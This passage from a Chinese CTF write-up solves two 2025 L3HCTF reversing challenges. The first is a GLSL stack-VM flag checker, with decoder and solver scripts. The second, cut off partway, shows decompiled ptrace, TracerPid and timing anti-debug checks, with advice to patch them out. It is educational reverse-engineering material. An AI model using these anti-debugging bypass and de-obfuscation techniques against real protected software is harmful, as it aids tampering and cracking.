class="number">0x3E</span>, <span class="number">0x44</span>, <span class="number">0x0D</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0x67</span>, <span class="number">0x46</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x2F</span>, <span class="number">0x23</span>, <span class="number">0x2B</span>, <span class="number">0x53</span>, <span class="number">0x6A</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0x5E</span>, <span class="number">0x03</span>, <span class="number">0x7A</span>, <span class="number">0x4D</span>, <span class="number">0x5D</span>, <span class="number">0x77</span>, <span class="number">0x7D</span>, <span class="number">0x02</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0x17</span>, <span class="number">0x30</span>, <span class="number">0x12</span>, <span class="number">0x78</span>, <span class="number">0x1B</span>, <span class="number">0x7E</span>, <span class="number">0x51</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x67</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x3C</span>, <span class="number">0x01</span>, <span class="number">0x3B</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x38</span>, <span class="number">0x0D</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x78</span>, <span class="number">0x68</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x12</span>, <span class="number">0x3C</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x36</span>, <span class="number">0x21</span>, <span class="number">0x3B</span>, <span class="number">0x2A</span>, <span class="number">0x3B</span>, <span class="number">0x24</span>, <span class="number">0x1C</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0x4A</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0x73</span>, <span class="number">0x58</span>, <span class="number">0x16</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>]</span><br><span class="line">s[<span class="number">0</span>] ^= <span class="number">0x56</span></span><br><span class="line">xor = <span class="string">b&quot;Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1760</span>):</span><br><span class="line">    s[i] ^= xor[i%<span class="number">460</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, s)))</span><br></pre></td></tr></table></figure>

<p>解得GL虚拟机实现代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">#version 430 core</span><br><span class="line"></span><br><span class="line">layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;</span><br><span class="line">layout(std430, binding = 0) buffer OpCodes  &#123; int opcodes[]; &#125;;</span><br><span class="line">layout(std430, binding = 2) buffer CoConsts &#123; int co_consts[]; &#125;;</span><br><span class="line">layout(std430, binding = 3) buffer Cipher   &#123; int cipher[16]; &#125;;</span><br><span class="line">layout(std430, binding = 4) buffer Stack    &#123; int stack_data[256]; &#125;;</span><br><span class="line">layout(std430, binding = 5) buffer Out      &#123; int verdict;         &#125;;</span><br><span class="line"></span><br><span class="line">const int MaxInstructionCount = 1000;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    if (gl_GlobalInvocationID.x &gt; 0) return;</span><br><span class="line"></span><br><span class="line">    uint ip = 0u;</span><br><span class="line">    int sp = 0;</span><br><span class="line">    verdict = -233;</span><br><span class="line"></span><br><span class="line">    while (ip &lt; uint(MaxInstructionCount))</span><br><span class="line">    &#123;</span><br><span class="line">        int opcode = opcodes[int(ip)];</span><br><span class="line">        int arg    = opcodes[int(ip)+1];</span><br><span class="line"></span><br><span class="line">        switch (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">            case 2:</span><br><span class="line">                stack_data[sp++] = co_consts[arg];</span><br><span class="line">                break;</span><br><span class="line">            case 7:</span><br><span class="line">            &#123;</span><br><span class="line">                int b = stack_data[--sp];</span><br><span class="line">                int a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a + b;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            case 8:</span><br><span class="line">            &#123;</span><br><span class="line">                int a = stack_data[--sp];</span><br><span class="line">                int b = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a - b;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            case 14:</span><br><span class="line">            &#123;</span><br><span class="line">                int b = stack_data[--sp];</span><br><span class="line">                int a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a ^ b;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            case 15:</span><br><span class="line">            &#123;</span><br><span class="line">                int b = stack_data[--sp];</span><br><span class="line">                int a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = int(a == b);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            case 16:</span><br><span class="line">            &#123;</span><br><span class="line">                bool ok = true;</span><br><span class="line">                for (int i = 0; i &lt; 16; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    if (stack_data[i] != (cipher[i] - 20))</span><br><span class="line">                    &#123; </span><br><span class="line">                        ok = false; </span><br><span class="line">                        break; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                verdict = ok ? 1 : -1;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            case 18:</span><br><span class="line">            &#123;</span><br><span class="line">                int c = stack_data[--sp];</span><br><span class="line">                if (c == 0) ip = uint(arg);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            default:</span><br><span class="line">                verdict = 500;</span><br><span class="line">                return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ip+=2;</span><br><span class="line">    &#125;</span><br><span class="line">    verdict = 501;</span><br><span class="line">&#125;</span><br><span class="line">l </span><br><span class="line">#version 330</span><br><span class="line"></span><br><span class="line">#define S(a,b,t) smoothstep(a,b,t)</span><br><span class="line"></span><br><span class="line">uniform float time;</span><br><span class="line"></span><br><span class="line">out vec4 fragColor;</span><br><span class="line"></span><br><span class="line">mat2 Rot(float a) &#123;</span><br><span class="line">    float s = sin(a);</span><br><span class="line">    float c = cos(a);</span><br><span class="line">    return mat2(c, -s, s, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vec2 hash(vec2 p) &#123;</span><br><span class="line">    p = vec2(dot(p, vec2(2127.1, 81.17)), dot(p, vec2(1269.5, 283.37)));</span><br><span class="line">    return fract(sin(p) * 43758.5453);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">float noise(vec2 p) &#123;</span><br><span class="line">    vec2 i = floor(p);</span><br><span class="line">    vec2 f = fract(p);</span><br><span class="line">    vec2 u = f * f * (3.0 - 2.0 * f);</span><br><span class="line"></span><br><span class="line">    return mix(</span><br><span class="line">        mix(dot(-1.0 + 2.0 * hash(i + vec2(0.0, 0.0)), f - vec2(0.0, 0.0)),</span><br><span class="line">            dot(-1.0 + 2.0 * hash(i + vec2(1.0, 0.0)), f - vec2(1.0, 0.0)), u.x),</span><br><span class="line">        mix(dot(-1.0 + 2.0 * hash(i + vec2(0.0, 1.0)), f - vec2(0.0, 1.0)),</span><br><span class="line">            dot(-1.0 + 2.0 * hash(i + vec2(1.0, 1.0)), f - vec2(1.0, 1.0)), u.x),</span><br><span class="line">        u.y</span><br><span class="line">    ) * 0.5 + 0.5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main() &#123;</span><br><span class="line">    vec2 uSize = vec2(1280.0, 800.0);</span><br><span class="line">    vec2 uv = gl_FragCoord.xy / uSize;</span><br><span class="line"></span><br><span class="line">    float ratio = uSize.x / uSize.y;</span><br><span class="line">    vec2 tuv = uv - 0.5;</span><br><span class="line"></span><br><span class="line">    float degree = noise(vec2(time * 0.1, tuv.x * tuv.y));</span><br><span class="line">    tuv.y *= 1.0 / ratio;</span><br><span class="line">    tuv *= Rot(radians((degree - 0.5) * 720.0 + 180.0));</span><br><span class="line">    tuv.y *= ratio;</span><br><span class="line"></span><br><span class="line">    float frequency = 3.5;</span><br><span class="line">    float amplitude = 10.0;</span><br><span class="line">    float speed = time * 1.5;</span><br><span class="line"></span><br><span class="line">    tuv.x += sin(tuv.y * frequency + speed) / amplitude;</span><br><span class="line">    tuv.y += sin(tuv.x * frequency * 1.5 + speed) / (amplitude * 0.5);</span><br><span class="line"></span><br><span class="line">    vec3 color1 = vec3(0.8, 0.4, 0.9);</span><br><span class="line">    vec3 color2 = vec3(0.4, 0.7, 1.0);</span><br><span class="line">    vec3 color3 = vec3(1.0, 0.6, 0.4);</span><br><span class="line">    vec3 color4 = vec3(0.6, 1.0, 0.6);</span><br><span class="line"></span><br><span class="line">    vec3 layer1 = mix(color1, color2, S(-0.3, 0.2, (tuv * Rot(radians(-5.0))).x));</span><br><span class="line">    vec3 layer2 = mix(color3, color4, S(-0.3, 0.2, (tuv * Rot(radians(-5.0))).x));</span><br><span class="line">    vec3 finalColor = mix(layer1, layer2, S(0.5, -0.3, tuv.y));</span><br><span class="line"></span><br><span class="line">    fragColor = vec4(finalColor, 1.0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析虚拟机的字节码的作用如下：</p>
<p>2, x → PUSH co_consts[x]</p>
<p>7, 0 → ADD</p>
<p>8, 0 → SUB</p>
<p>14, 0 → XOR</p>
<p>15 ,x→CMP_EQ (y &#x3D;&#x3D; x)</p>
<p>16 → CHECK（对前16个栈值与 cipher-20 比较）</p>
<p>18，addr→ JMP_IF_ZERO addr</p>
<p>由开头的layout可以对应到源程序里的初始化区域</p>
<p><img src="../images/2025-L3HCTF/60c3e82d-beab-42dd-9013-49cd331d2be9.png" alt="img"></p>
<p>向上继续溯源可以找到真正初始化数据的位置</p>
<p><img src="../images/2025-L3HCTF/c791a1be-391d-4aee-b9f9-cf64a21a4e07.png" alt="img"></p>
<p>提出来所有的opcodes，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">2,0,</span><br><span class="line">2,1,2,0,14,0,2,16,8,0,</span><br><span class="line">2,2,2,1,14,0,2,17,8,0,</span><br><span class="line">2,3,2,2,14,0,2,18,7,0,</span><br><span class="line">2,4,2,3,14,0,2,19,7,0,</span><br><span class="line">2,5,2,4,14,0,2,20,8,0,</span><br><span class="line">2,6,2,5,14,0,2,21,7,0,</span><br><span class="line">2,7,2,6,14,0,2,22,7,0,</span><br><span class="line">2,8,2,7,14,0,2,23,7,0,</span><br><span class="line">2,9,2,8,14,0,2,24,7,0,</span><br><span class="line">2,10,2,9,14,0,2,25,7,0,</span><br><span class="line">2,11,2,10,14,0,2,26,7,0,</span><br><span class="line">2,12,2,11,14,0,2,27,8,0,</span><br><span class="line">2,13,2,12,14,0,2,28,8,0,</span><br><span class="line">2,14,2,13,14,0,2,29,7,0,</span><br><span class="line">2,15,2,14,14,0,2,30,8,0,</span><br><span class="line">16,0,</span><br><span class="line">2,16,2,17,15,0,18,84,</span><br><span class="line">2,31,1,0,3,1</span><br></pre></td></tr></table></figure>

<p>解析一下每一组的操作</p>
<p>2,0,        &#x2F;&#x2F;PUSH co_consts[0]</p>
<p>2,1,        &#x2F;&#x2F; PUSH co_consts[1]</p>
<p>14,0,       &#x2F;&#x2F; XOR </p>
<p>2,16,       &#x2F;&#x2F; PUSH co_consts[16]</p>
<p>8,0         &#x2F;&#x2F;  SUB  </p>
<p>最后的比较是和cipher[i]-20进行比较</p>
<p> 最后可以写出exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CIPHER = [<span class="number">0xF3</span>, <span class="number">0x82</span>, <span class="number">0x06</span>, <span class="number">0x1FD</span>, <span class="number">0x150</span>, <span class="number">0x38</span>, <span class="number">0xB2</span>, <span class="number">0xDE</span>, <span class="number">0x15A</span>, <span class="number">0x197</span>, <span class="number">0x9C</span>, <span class="number">0x1D7</span>, <span class="number">0x6E</span>, <span class="number">0x28</span>, <span class="number">0x146</span>,</span><br><span class="line">          <span class="number">0x97</span>]</span><br><span class="line">CONSTS = [<span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xFA</span>, <span class="number">0x86</span>, <span class="number">0x6E</span>, <span class="number">0x8F</span>, <span class="number">0xAF</span>, <span class="number">0xBF</span>, <span class="number">0xC9</span>, <span class="number">0x64</span>, <span class="number">0xD7</span>, <span class="number">0xC3</span>, <span class="number">0xE3</span>, <span class="number">0xEF</span>, <span class="number">0x87</span>, <span class="number">0x00</span>]</span><br><span class="line">op_pattern = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">targets = [c - <span class="number">20</span> <span class="keyword">for</span> c <span class="keyword">in</span> CIPHER]</span><br><span class="line">inputs = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">inputs[<span class="number">0</span>] = targets[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">    prev_input = inputs[i - <span class="number">1</span>]</span><br><span class="line">    target = targets[i]</span><br><span class="line">    const = CONSTS[i - <span class="number">1</span>]</span><br><span class="line">    op_type = op_pattern[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op_type == <span class="number">0</span>:  <span class="comment"># ADD</span></span><br><span class="line">        intermediate = (target - const)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">elif</span> op_type == <span class="number">1</span>:  <span class="comment"># SUB</span></span><br><span class="line">        intermediate = (const - target)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    inputs[i] = intermediate ^ prev_input</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(inputs).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<h2><span id="obfuscate">obfuscate</span><a href="#obfuscate" class="header-anchor"></a></h2><p>ida反编译错误，main有爆红，不用管直接分析其他函数，分别找到如下函数</p>
<p>首先是3处反调试</p>
<ol>
<li>ptrace</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_7E20</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">-1</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>读取文件Tracerid值（动调跟进解密后的字符串可以看到Tracerid）</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7EC0</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">140</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+9Ch] [rbp-44h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+A0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> *needle; <span class="comment">// [rsp+A8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+B4h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> filename[<span class="number">18</span>]; <span class="comment">// [rsp+BAh] [rbp-26h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+CCh] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> modes[<span class="number">2</span>]; <span class="comment">// [rsp+D2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+D4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+DAh] [rbp-6h] BYREF</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+DEh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">1053795514</span>;</span><br><span class="line">  v13 = <span class="number">-10245</span>;</span><br><span class="line">  v11 = <span class="number">468703135</span>;</span><br><span class="line">  xor_dec(&amp;v12, &amp;v11, <span class="number">6LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  *modes = <span class="number">29201</span>;</span><br><span class="line">  v9 = <span class="number">233665123</span>;</span><br><span class="line">  xor_dec(modes, &amp;v9, <span class="number">2LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  qmemcpy(filename, <span class="string">&quot;uU \\9\n!V6C&#125;@.D&amp;F)%&quot;</span>, <span class="keyword">sizeof</span>(filename));</span><br><span class="line">  v7 = <span class="number">861021530</span>;</span><br><span class="line">  xor_dec(filename, &amp;v7, <span class="number">18LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  needle = a1;</span><br><span class="line">  stream = fopen(filename, modes);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( fgets(s, <span class="number">128</span>, stream) &amp;&amp; (!__isoc99_sscanf(s, &amp;v12, s, &amp;v3) || !<span class="built_in">strstr</span>(s, needle)) )</span><br><span class="line">      ;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>getpid</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">sub_8030</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = __rdtsc();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  <span class="built_in">getpid</span>();</span><br><span class="line">  v1 = __rdtsc();</span><br><span class="line">  result = v1 - v3;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">0x186A0</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个个force jmp或者nop后patch即可动调</p>
<p>比较函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_6180</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)format = <span class="number">0x61C477DB26D672BDLL</span>;</span><br><span class="line">  v11 = <span class="number">0x41BD3F9C2FD86CACLL</span>;</span><br><span class="line">  v9 = <span class="number">1102520059</span>;</span><br><span class="line">  <span class="built_in">xor_dec</span>(format, &amp;v9, <span class="number">16LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_9031, <span class="built_in">sizeof</span>(dest));</span><br><span class="line">  v7 = <span class="number">1350490027</span>;</span><br><span class="line">  <span class="built_in">xor_dec</span>(dest, &amp;v7, <span class="number">38LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(src, &amp;cmp, <span class="number">0x21uLL</span>);</span><br><span class="line">  v5 = <span class="number">1189641421</span>;</span><br><span class="line">  <span class="built_in">xor_dec</span>(src, &amp;v5, <span class="number">33LL</span>, <span class="number">4LL</span>);</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="built_in">memcpy</span>(v3, src, <span class="number">0x21uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">unsigned</span> __int8 *)(v4 + i) != (<span class="type">unsigned</span> __int8)v3[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及两个混淆比较厉害的加密函数（分析可知是rc5加密），可以借助ida9自带的goomba插件解除部分混淆，右键</p>
<p>De-obfuscate即可，但是得到的函数依然存在很多逻辑混淆</p>
<p>比如恒真恒假跳转</p>
